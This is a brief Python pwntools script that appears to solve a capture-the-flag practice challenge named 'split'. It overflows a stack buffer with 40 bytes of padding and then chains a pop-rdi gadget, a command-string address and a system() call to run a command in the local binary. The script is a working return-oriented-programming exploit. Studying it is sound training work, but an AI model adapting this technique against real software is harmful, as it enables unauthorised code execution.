from pwn import *

Gadget_System    = 0x40074b
Gadget_rdi       = 0x4007c3
Gadget_cmdString = 0x601060

bin = "./split"

p = process(bin)

print(p.recvuntil("> "))

payload = \
[
	b"A"*(32+8),
	p64(Gadget_rdi),
	p64(Gadget_cmdString),
	p64(Gadget_System)
]

p.sendline(b"".join(payload))

print(p.recvall(timeout=1))

